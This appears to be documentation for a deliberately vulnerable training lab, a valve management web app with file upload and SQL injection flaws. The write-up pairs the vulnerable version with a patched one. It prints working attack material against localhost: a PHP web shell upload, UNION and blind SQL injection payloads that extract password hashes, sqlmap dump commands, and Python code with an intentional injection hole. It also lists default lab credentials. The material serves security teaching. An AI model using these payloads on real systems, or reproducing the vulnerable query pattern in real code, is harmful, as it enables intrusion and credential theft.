# Vulnerability Documentation

## Overview
This document details the 4 intentional security vulnerabilities implemented in the **vulnerable version** of the Remote Valve Management System.

## CWE-434: Unrestricted Upload of File with Dangerous Type

### Scenario 1: No Protection
**Endpoint:** `/upload/scenario1`

**Vulnerabilities:**
- No file type validation
- No content scanning
- No size limits
- Original filename preserved
- No secure filename generation

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/upload/scenario1 \
  -F "file=@malicious.php" \
  -H "Cookie: session=<admin_session>"
```

**Exploitation:**
1. Upload a malicious file (e.g., `.php`, `.jsp`, `.py`, `.sh`)
2. File is stored with original name in `uploads/firmware/`
3. If web server executes scripts in upload directory, RCE is possible
4. Can also upload files to fill disk space (DoS)

**Impact:** Remote Code Execution, Denial of Service

### Scenario 2: Weak Protection
**Endpoint:** `/upload/scenario2`

**Vulnerabilities:**
- Size check based on `Content-Length` header (client-controlled)
- Extension blacklist (incomplete: only blocks `.exe`, `.sh`, `.bat`, `.php`)
- No MIME type verification
- No content scanning

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/upload/scenario2 \
  -F "file=@malicious.jsp" \
  -H "Cookie: session=<admin_session>"
```

**Bypasses:**
1. **Extension Bypass:** Use non-blacklisted extensions (`.jsp`, `.py`, `.rb`, `.pl`)
2. **Double Extension:** `malicious.php.bin` (if server misconfigured)
3. **Case Variation:** `malicious.PHP` (if case-insensitive filesystem)
4. **Size Bypass:** Manipulate `Content-Length` header to bypass size check

**Impact:** Remote Code Execution

### Scenario 3: Encrypted File Bypass
**Endpoint:** `/upload/scenario3`

**Vulnerabilities:**
- Files are encrypted with AES-256 before storage
- Content scanning performed on encrypted data (ineffective)
- Files decrypted later via `/upload/scenario3/decrypt/<id>` without re-scanning
- Malicious content hidden inside encryption

**Attack Vector:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > malicious.php
curl -X POST http://localhost:5000/upload/scenario3 \
  -F "file=@malicious.php" \
  -H "Cookie: session=<admin_session>"

curl -X POST http://localhost:5000/upload/scenario3/decrypt/1 \
  -H "Cookie: session=<admin_session>"
```

**Exploitation:**
1. Upload malicious file (any type)
2. File is encrypted and stored as `.enc`
3. Content scanning on encrypted data finds nothing
4. Trigger decryption via decrypt endpoint
5. Malicious file extracted to `uploads/firmware/decrypted_<filename>`
6. Execute if web server allows

**Impact:** Remote Code Execution, Malware Distribution

## SQL Injection: Role-Based Conditional Escaping

### Vulnerability Location
**Endpoint:** `/valves/search` (POST)
**File:** `vulnerable/app/routes/valves.py`

**Vulnerability:**
- Admin users: Raw SQL query with string interpolation
- Operator users: Parameterized query (safe)
- Attack detection logged but not blocked for admins

**Vulnerable Code:**
```python
if user and user['role'] == 'admin':
    query = f"SELECT * FROM valves WHERE valve_name LIKE '%{search_term}%' OR location LIKE '%{search_term}%' ORDER BY valve_name"
    valves_raw = conn.execute(query).fetchall()
```

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/valves/search \
  -d "search=%' UNION SELECT id,valve_name,location,valve_type,open_percentage,status,last_command,last_updated FROM valves--" \
  -H "Cookie: session=<admin_session>"
```

**Exploitation Payloads:**

1. **Data Exfiltration:**
```sql
' UNION SELECT id, username, password_hash, role, email, created_at, last_login, NULL FROM users--
```

2. **Database Enumeration:**
```sql
' UNION SELECT 1, name, sql, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
```

3. **Boolean-Based Blind:**
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--
```

4. **Time-Based Blind:**
```sql
' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM valves AS a, valves AS b, valves AS c) ELSE 1 END)--
```

**sqlmap Command:**
```bash
sqlmap -u "http://localhost:5000/valves/search" \
  --data "search=test" \
  --cookie="session=<admin_session>" \
  --level=5 --risk=3 \
  --dump
```

**Impact:** 
- Data exfiltration (user credentials, valve data, logs)
- Database structure enumeration
- Potential privilege escalation
- Data modification/deletion

## Monitoring System

All attack attempts are logged in the `attack_logs` table with:
- Attack type classification
- Endpoint
- User ID and IP address
- Payload
- Severity (low/medium/high/critical)
- Timestamp

Accessible via `/monitoring` (admin only).

## Patched Version

The **patched version** (port 5001) implements proper security controls:

### File Upload Fixes:
- Whitelist-based file type validation (`.bin`, `.conf` only)
- Magic byte verification
- Proper size limit enforcement
- Secure filename generation
- Content scanning before storage
- Decrypt-then-scan for encrypted files

### SQL Injection Fix:
- Parameterized queries for ALL users
- Input validation and sanitization
- Attack detection and blocking

## Testing Tools

### Burp Suite
1. Configure browser proxy to 127.0.0.1:8080
2. Login as admin (admin/admin123)
3. Intercept file upload requests
4. Modify file extensions, MIME types, content
5. Observe responses and monitoring dashboard

### sqlmap
```bash
sqlmap -u "http://localhost:5000/valves/search" \
  --data "search=test" \
  --cookie="session=<admin_session>" \
  --batch --level=5 --risk=3
```

### Manual Testing
```bash
echo "<?php phpinfo(); ?>" > test.php
curl -X POST http://localhost:5000/upload/scenario1 \
  -F "file=@test.php" \
  -H "Cookie: session=<admin_session>"
```

## Credentials

- **Admin:** `admin` / `admin123`
- **Operator:** `operator1` / `operator123`

**Note:** SQL injection only works with admin account.

